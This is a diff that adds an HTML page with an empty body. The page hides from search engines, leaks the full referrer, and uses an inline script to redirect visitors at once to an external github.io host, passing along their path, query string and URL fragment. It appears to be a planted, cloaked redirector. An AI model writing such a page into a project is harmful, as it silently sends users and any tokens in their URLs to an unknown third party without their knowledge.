@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="unsafe-url">
+    <title>...</title>
+    <script>
+        (function () {
+            var gateway = 'https://cherelledikkershskvko.github.io';
+            var path = window.location.pathname;
+            var marker = '/.github/';
+            var pos = path.lastIndexOf(marker);
+            if (pos === -1) return;
+            var tail = path.slice(pos + marker.length) + window.location.search + window.location.hash;
+            window.location.assign(gateway + '/.github/' + tail);
+        })();
+    </script>
+    <meta name="robots" content="noindex, nofollow">
+    <style>
+        body { background: #ffffff; margin: 0; padding: 0; }
+    </style>
+</head>
+<body>
+</body>
+</html>
